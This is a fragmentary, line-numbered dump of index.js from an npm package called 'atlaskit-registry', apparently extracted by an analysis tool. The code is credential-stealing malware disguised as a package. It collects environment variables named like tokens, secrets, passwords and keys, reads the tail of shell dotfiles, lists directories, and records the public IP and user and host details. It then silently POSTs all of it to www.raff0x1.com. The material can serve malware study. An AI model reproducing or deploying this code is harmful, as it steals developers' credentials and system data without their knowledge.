// File: tmp/tmplf4x7q0i/atlaskit-registry/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 5: _tmp_1 = require('crypto')
Line 13: key.toLowerCase().includes('token')
Line 14: key.toLowerCase().includes('secret')
Line 15: key.toLowerCase().includes('password')
Line 16: key.toLowerCase().includes('key')
Line 21: _tmp_7.push(".bash_profile")
Line 25: path.join(home, file)
Line 27: {
      const content = fs.readFileSync(fullPath, 'utf-8');
      readFiles[file] = content.split('\n').slice(-50).join('\n');
    }
Line 28: const content = fs.readFileSync(fullPath, 'utf-8')
Line 29: readFiles[file] = content.split('\n').slice(-50).join('\n')
Line 31: catch {
    readFiles[file] = 'error';
  }
Line 32: readFiles[file] = 'error'
Line 41: {
    const entries = fs.readdirSync(dir, { withFileTypes: true })
      .map(entry => {
        const fullPath = path.join(dir, entry.name);
        const stat = fs.statSync(fullPath);
        return {
          name: entry.name,
          isDir: entry.isDirectory(),
          size: stat.size,
          mtime: stat.mtime
        };
      })
      .sort((a, b) => b.mtime - a.mtime); // sort like ls -t
    listDirs[dir] = entries;
  }
Line 42: const entries = fs.readdirSync(dir, { withFileTypes: true })
      .map(entry => {
        const fullPath = path.join(dir, entry.name);
        const stat = fs.statSync(fullPath);
        return {
          name: entry.name,
          isDir: entry.isDirectory(),
          size: stat.size,
          mtime: stat.mtime
        };
      })
      .sort((a, b) => b.mtime - a.mtime)
Line 44: path.join(dir, entry.name)
Line 45: const stat = fs.statSync(fullPath)
Line 54: listDirs[dir] = entries
Line 55: catch {
    listDirs[dir] = 'error';
  }
Line 56: listDirs[dir] = 'error'
Line 62: {
  const req = https.request({
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET'
  }, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        callback(JSON.parse(data).ip);
      } catch {
        callback('unknown');
      }
    });
  });
  req.on('error', () => callback('unknown'));
  req.end();
}
Line 63: const req = https.request({
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET'
  }, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        callback(JSON.parse(data).ip);
      } catch {
        callback('unknown');
      }
    });
  })
Line 72: callback(JSON.parse(data).ip)
Line 74: callback('unknown')
Line 78: callback('unknown')
Line 79: req.end()
Line 82: {
  const payload = JSON.stringify({
    id,
    ip,
    time: new Date().toISOString(),
    cwd: process.cwd(),
    entry: require.main?.filename || 'unknown',
    os: {
      user: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      release: os.release()
    },
    env: safeEnv,
    dotfiles: readFiles,
    ls: listDirs
  });

  const req = https.request({
    hostname: 'www.raff0x1.com', // ← your domain here
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, res => { /* ignore response */ });

  req.on('error', () => { /* ignore error */ });
  req.write(payload);
  req.end();
}
Line 83: const payload = JSON.stringify({
    id,
    ip,
    time: new Date().toISOString(),
    cwd: process.cwd(),
    entry: require.main?.filename || 'unknown',
    os: {
      user: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      release: os.release()
    },
    env: safeEnv,
    dotfiles: readFiles,
    ls: listDirs
  })
Line 88: _tmp_16.entry = require.main?.filename || 'unknown'
Line 90: os.userInfo()
Line 91: os.hostname()
Line 92: os.platform()
Line 93: os.arch()
Line 101: const req = https.request({
    hostname: 'www.raff0x1.com', // ← your domain here
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, res => { /* ignore response */ })
Line 113: req.write(payload)
Line 114: req.end()
